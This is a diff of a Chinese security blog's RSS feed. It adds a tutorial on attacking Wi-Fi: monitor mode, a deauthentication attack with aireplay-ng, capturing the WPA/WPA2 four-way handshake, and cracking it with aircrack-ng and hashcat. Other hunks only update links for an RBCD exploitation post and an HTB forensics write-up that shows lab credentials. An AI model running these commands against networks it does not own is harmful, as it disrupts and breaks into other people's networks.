+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ip link set wlan0 up
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看网卡真实强度&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo cat /sys/kernel/debug/ieee80211/phy*/mt76/txpower_sku | grep tmac
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看wifi列表&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmcli dev wifi list
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;or
@@ -2845,6 +2849,10 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo airmon-ng check 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;杀掉全部干扰进程&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo airmon-ng check kill
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意，这会使我们的网卡回归使可能会被锁定，不得使用托管功能，使用如下命令检查&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo rfkill list all
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果被锁定，使用如下命令解封&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo rfkill unblock wifi
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;airodump-ng数据包捕获&#34;&gt;Airodump-ng(数据包捕获)
 &lt;/h4&gt;&lt;p&gt;输出截获所有数据情况&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo airodump-ng wlan0mon
@@ -2888,14 +2896,37 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; 是要发送的 deauth 次数;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 表示连续发送它们
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-a 00：14：6C：7A：41：81 是接入点的 MAC 地址
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-c 00：0F：B5：32：31：31 是要取消身份验证的客户端的 MAC 地址;如果省略，则连接的所有客户端都会被攻击
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;劫持四次握手爆破wpawpa2密码&#34;&gt;劫持四次握手爆破wpa/wpa2密码
+&lt;/h3&gt;&lt;p&gt;调整到监听，开始抓包&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo airmon-ng start
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo airodump wlan0mon
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;找到存在客户端的wifi目标，利用&amp;ndash;bssid以及-c筛选出来，启用-w保存抓包&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo airodump wlan0mon --bssid &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$&lt;span style=&#34;color:#e6db74&#34;&gt;目标wifi的bssid“ -c &amp;#34;&lt;/span&gt;$目标信道&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; -w &lt;/span&gt;$&lt;span style=&#34;color:#e6db74&#34;&gt;保存名称
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;抓包同时，另起窗口对此ap发动取消认证攻击&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo aireplay-ng -0 &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-0 表示取消身份验证
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; 是要发送的 deauth 次数;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 表示连续发送它们
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-a 00：14：6C：7A：41：81 是接入点的 MAC 地址
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-c 00：0F：B5：32：31：31 是要取消身份验证的客户端的 MAC 地址;如果省略，则连接的所有客户端都会被攻击
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只要看到抓包中notes字段出现EAPOL，则证明已经捕获4次握手，等待一分钟后断开抓包&lt;/p&gt;
+&lt;p&gt;我们得到的$名称-01.cap就是有价值的流量包&lt;/p&gt;
+&lt;p&gt;aircrach-ng爆破(使用cpu)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;aircrack-ng test6-01.cap -w wifi_passlist_geo.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;hashcat爆破(gpu爆破)&lt;/p&gt;
+&lt;p&gt;先转去以下网站转换hash&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://hashcat.net/cap2hashcat/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;转换完毕的文件如下爆破&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hashcat -m &lt;span style=&#34;color:#ae81ff&#34;&gt;22000&lt;/span&gt; hash.file -w dic.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;总结，实际操作后发现现实并不好攻击，字典量所需太大，后续恶意门户会研究&lt;/p&gt;
+</description>
         </item>
         <item>
         <title>使用普通用户帐户远程利用RBCD</title>
-        <link>http://localhost:1313/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/</link>
+        <link>https://wackymaker.github.io/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/</link>
         <pubDate>Sat, 23 Aug 2025 20:02:05 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/</guid>
+        <guid>https://wackymaker.github.io/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/</guid>
         <description>&lt;h1 id=&#34;使用普通用户帐户远程利用-rbcd基于资源委派&#34;&gt;使用普通用户帐户远程利用 RBCD（基于资源委派）
 &lt;/h1&gt;&lt;h2 id=&#34;我是站在巨人们的肩膀上&#34;&gt;我是站在巨人们的肩膀上
 &lt;/h2&gt;&lt;p&gt;在这篇文章开始之前，我本来想详细解释一下rbcd，奈何&lt;a class=&#34;link&#34; href=&#34;https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -3100,10 +3131,10 @@
         </item>
         <item>
         <title>血缇之书</title>
-        <link>http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</link>
+        <link>https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</link>
         <pubDate>Sat, 23 Aug 2025 19:40:56 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</guid>
+        <guid>https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</guid>
         <description>&lt;h1 id=&#34;信息收集-枚举&#34;&gt;信息收集-枚举
 &lt;/h1&gt;&lt;h2 id=&#34;前枚举&#34;&gt;前枚举
 &lt;/h2&gt;&lt;h3 id=&#34;域名解析&#34;&gt;域名解析
@@ -6002,16 +6033,16 @@ linux换行&lt;/p&gt;
         </item>
         <item>
         <title>Origins-wp</title>
-        <link>http://localhost:1313/post/origins-htb/</link>
+        <link>https://wackymaker.github.io/post/origins-htb/</link>
         <pubDate>Sat, 23 Aug 2025 18:11:16 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/origins-htb/</guid>
+        <guid>https://wackymaker.github.io/post/origins-htb/</guid>
         <description>&lt;h2 id=&#34;题目简介&#34;&gt;题目简介
 &lt;/h2&gt;&lt;p&gt;最近在福雷拉发生了一起重大事件。大约 20 GB 的数据从内部 s3 存储桶中被盗，攻击者现在正在勒索 Forela。在根本原因分析过程中，怀疑 FTP 服务器是攻击的来源。发现该服务器也遭到入侵，一些数据被盗，导致整个环境进一步受到损害。系统会向您提供最小的 PCAP 文件。您的目标是查找暴力破解和数据泄露的证据。&lt;/p&gt;
 &lt;h2 id=&#34;攻击者ip地址&#34;&gt;攻击者ip地址
 &lt;/h2&gt;&lt;p&gt;解压提供给我们的zip获取ftp.pcap流量包&lt;/p&gt;
 &lt;p&gt;wireshark打开后显示出了题目给的547个数据包，由于提示了ftp以及爆破，我们直接过滤ftp.request.command查看ftp流量中请求命令
-&lt;img src=&#34;http://localhost:1313/origins/image-2.png&#34;
+&lt;img src=&#34;https://wackymaker.github.io/origins/image-2.png&#34;
 	
 	
 	
@@ -6025,7 +6056,7 @@ linux换行&lt;/p&gt;
 &lt;/h2&gt;&lt;p&gt;将得到的ip去ip38查询&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://www.ip38.com/
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到结果是印度的孟买&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-3.png&#34;
 	
 	
 	
@@ -6035,7 +6066,7 @@ linux换行&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;p&gt;答案:Mumbai&lt;/p&gt;
 &lt;h2 id=&#34;备份服务器使用了哪个-ftp-应用程序输入全名和版本格式名称版本&#34;&gt;备份服务器使用了哪个 FTP 应用程序？输入全名和版本。（格式：名称版本）
-&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-4.png&#34;
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-4.png&#34;
 	
 	
 	
@@ -6047,7 +6078,7 @@ linux换行&lt;/p&gt;
 &lt;p&gt;答案:vsFTPd 3.0.5&lt;/p&gt;
 &lt;h2 id=&#34;攻击者已对服务器发起暴力攻击此攻击何时开始&#34;&gt;攻击者已对服务器发起暴力攻击。此攻击何时开始？
 &lt;/h2&gt;&lt;p&gt;在第一题中，我们已经能从显示中看出目标的爆破过程，详细打开第一个包，我们能看到第一次攻击的UTC&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-5.png&#34;
 	
 	
 	
@@ -6058,7 +6089,7 @@ linux换行&lt;/p&gt;
 &lt;p&gt;答案:2024-05-03 04:12:54&lt;/p&gt;
 &lt;h2 id=&#34;授予攻击者访问权限的正确凭据是什么格式用户名密码&#34;&gt;授予攻击者访问权限的正确凭据是什么？（格式用户名：密码）
 &lt;/h2&gt;&lt;p&gt;我们从ftp请求命令往下滑看到爆破者尝试的最后一个凭证信息&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-6.png&#34;
 	
 	
 	
@@ -6067,7 +6098,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;我十分确信凭证就是forela-ftp:ftprocks69$，在follow了这个包的tcp下面包的信息也佐证了这一点&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-7.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-7.png&#34;
 	
 	
 	
@@ -6078,7 +6109,7 @@ linux换行&lt;/p&gt;
 &lt;p&gt;答案:fore-ftp/ftprocks69$&lt;/p&gt;
 &lt;h2 id=&#34;攻击者已从服务器中泄露文件用于下载远程文件的-ftp-命令是什么&#34;&gt;攻击者已从服务器中泄露文件。用于下载远程文件的 FTP 命令是什么？
 &lt;/h2&gt;&lt;p&gt;继续查看ftp命令&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-9.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-9.png&#34;
 	
 	
 	
@@ -6087,7 +6118,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;可以看到攻击者对这个文件进行了操作，进行流追踪&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-10.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-10.png&#34;
 	
 	
 	
@@ -6100,7 +6131,7 @@ linux换行&lt;/p&gt;
 &lt;h2 id=&#34;攻击者能够破坏备份-ssh-服务器的凭据此-ssh-服务器的密码是什么&#34;&gt;攻击者能够破坏备份 SSH 服务器的凭据。此 SSH 服务器的密码是什么？
 &lt;/h2&gt;&lt;p&gt;我们通过ftp-data将流经数据文件保存下来&lt;/p&gt;
 &lt;p&gt;file&amp;gt;Export Objects&amp;gt;FTP-data&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-11.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-11.png&#34;
 	
 	
 	
@@ -6109,7 +6140,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;选择全部保存，pdf中保存了目标ssh密码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-12.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-12.png&#34;
 	
 	
 	
@@ -6120,7 +6151,7 @@ linux换行&lt;/p&gt;
 &lt;p&gt;答案:**B@ckup2024!**&lt;/p&gt;
 &lt;h2 id=&#34;2023-年数据存档的-s3-存储桶-url-是什么&#34;&gt;2023 年数据存档的 s3 存储桶 URL 是什么？
 &lt;/h2&gt;&lt;p&gt;同上方式搞到的s3_buckets.txt&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/origins/image-13.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/origins/image-13.png&#34;
 	
 	
 	
@@ -6136,18 +6167,18 @@ linux换行&lt;/p&gt;
         </item>
         <item>
         <title>Archives</title>
-        <link>http://localhost:1313/page/archives/</link>
+        <link>https://wackymaker.github.io/page/archives/</link>
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/page/archives/</guid>
+        <guid>https://wackymaker.github.io/page/archives/</guid>
         <description></description>
         </item>
         <item>
         <title>Search</title>
-        <link>http://localhost:1313/page/search/</link>
+        <link>https://wackymaker.github.io/page/search/</link>
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
         
-        <guid>http://localhost:1313/page/search/</guid>
+        <guid>https://wackymaker.github.io/page/search/</guid>
         <description></description>
         </item>
         
